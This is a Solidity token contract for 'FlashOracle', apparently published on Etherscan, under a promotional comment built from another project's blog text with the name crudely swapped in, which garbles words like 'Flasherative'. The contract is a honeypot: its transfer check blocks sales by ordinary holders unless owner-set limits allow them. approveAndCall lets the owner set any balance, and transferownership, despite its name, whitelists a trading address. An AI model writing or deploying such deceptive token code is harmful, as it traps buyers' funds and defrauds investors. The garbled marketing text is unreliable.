/**
 *Submitted for verification at Etherscan.io on 2021-06-28
*/

/*
Earn $FLASH ORACLE by becoming a Flasher moderator/community partner

Have you ever thought about becoming a Flasher moderator or community partner?
We are rewarding billions of $FLASH ORACLE for our moderators, and community partners!
To apply for the position
You need to obtain a SuperFlasher Role in our Discord Channel. Click here to join.
To become a SuperFlasher, you will need to be an active community member who helps answer questions and bring positive energy to the group.
As you help others, your level will grow automatically which is managed by our moderator bot Mee6. (The more you help and talk, the faster you transform into a SuperFlasher, and the faster you can apply to become a moderator)
SuperFlasher Role currently is set at level 15
Notice:
Once you are qualified to apply, let our team know. We will do a full review of history messages, and decide whether you are promoted or not
Let us know if you have other ideas or questions. We look forward to having you onboard and head to FLASH ORACLE together.

Flash Oracle Community Update

Introduction
When a small group of humans, passionate about Flasherative Agriculture and ecological integrity set forth in early 2017 to create a planetary health accounting system to transform our global economy from extractive and degenerative, to Flasherative, we were as naive as we were ambitious and passionate. In the 4 years since, we have learned, grown, and built. We have survived and thrived through a crypto bear market, political turmoil, and a global pandemic. Above all, we have remained dedicated to our lofty aim of nothing short of planetary Flasheration. We have also become very pragmatic about the systemic, market-based interventions needed to steer our global economy toward a mutualistic and Flasherative relationship with biosphere health.
The guiding principles that serve as the foundation for Flash Oracle’s approach to creating a decentralized and public infrastructure for ecological data, claims, and markets are the following:
Out cooperate the competition.
If you find something that needs to be done, do it.
Uplift and support the agency of stakeholders and Oracle participants.
Agile development.
Holistic scientific rigor and replicability.
This blog is an outline of where we have been, and where we are going. It is a letter to our community that will reference the whitepaper and show what things have changed as we have experimented, learned, brought products to markets, shipped code and created cutting edge ecological monitoring methodologies like the CarbonPlus Grasslands which was the methodology behind our large credit sale to Microsoft. This blog will outline the evolution in our approach, show the growth of a community far beyond the bounds of a single company, and outline our suggestions for what comes after mainnet launch. This blog is one-part logistics overview to coordinate the community for the upcoming decentralized main net launch and one-part retrospective reviewing how our approach, technology and focus has evolved. And finally, this blog is one-part invitation to co-create a bold approach to public infrastructure that accounts for and creates contracts, assets and market solutions to our environmental challenges.
This blog also includes:
A pre-launch timeline and checklist,
Launch ceremony overview,
Summary of important whitepaper points and how our approach has evolved.
Please consider this is an update in approach and an overview of the evolution that has taken place as we continue to iterate towards the vision laid out in the whitepaper.
Roadmap to Mainnet
We are quickly marching towards our mainnet launch date. We are still on track for an April 15 launch date.
Tuesday, March 30: Genesis Candidate Chain Live
Wednesday, March 31 Mainnet GenTX Submissions Open
Tuesday, April 6th: Candidate Chain Closes, GenTX window Closes
Thursday, April 15 1500 UTC Mainnet Launch Time.
April 15 is our target genesis date and mainnet launch. However, there is a review window for the genesis file candidate. If any changes must be made to the genesis file or Flash Ledger software, we will create a new candidate, and run that candidate for 48 hours, followed by a 24 hour pause before mainnet launch. This means that at any time between the launch of the candidate, the community audit ceremony outlined below, and mainnet launch, we may postpone mainnet and each postponement will mean a minimum of 3 day extension of the process.
It takes a village to launch a blockchain!
How to get involved:
Join the Genesis Prelaunch Devnet!
On Tuesday March 30 we will be launching our final internal testnet called the “Prelaunch Devnet”. This Oracle will have an identical genesis file to that of our mainnet, with the exception of GenTx and initial validator-set being restricted to team nodes, and core validators. Validators are encouraged to self delegate and initiate a validator on our Prelaunch Devnet once the chain is running so they can join the Oracle and verify their FLASH balances.
The genesis file can be found in our mainnet repo, and instructions to join the prelaunch devnet will be posted on github once the chain is live.
Of particular note: We will be reusing a previous chain-id for our Prelaunch Devnet, “Flash-devnet-5”. This is to make the checking of wallet balances easier for our token holders, who all connected their Keplr browser wallets to a previous devnet in order to submit their wallet addresses to us.
Check your token balance.
Investors and token holders will be able to check balances in one of two ways:
Checking your balance in Keplr. This can be done via the same “Flash Devnet” chain that you connected to when registering your address
Entering your address on our Prelaunch Devnet block explorer. This will be available at flashoracle.com once the chain is live
In addition to checking your individual token balance, token holders and validators are encouraged to audit our proposed genesis file against the token distribution scheme described later in this blog in the “Token Distribution at Mainnet Launch” section.
This process will serve to give the community the ability to check your wallet address with your allocation, and to audit other allocations, and compare with published allocation schemes. This is the software version and the allocation that is being run in genesis. After this, the Devnet will be halted, and there will be a period of at least two days for RND to update the genesis file — either in the instance of errors, or if the community feels there needs to be a reallocation.
Only token holders will be eligible to vote on the allocation scheme. Any questions regarding discrepancies in personal allocations for testnet participants, contributors and Oracle founders via the private sale, or other contributors to the community process of launching Flash Oracle can be sent to accounting [at] Flash.Oracle. Please see the following blog posts for setting up Keplr for use with FLASH tokens and Flash Oracle security best practices.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract FlashOracle {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}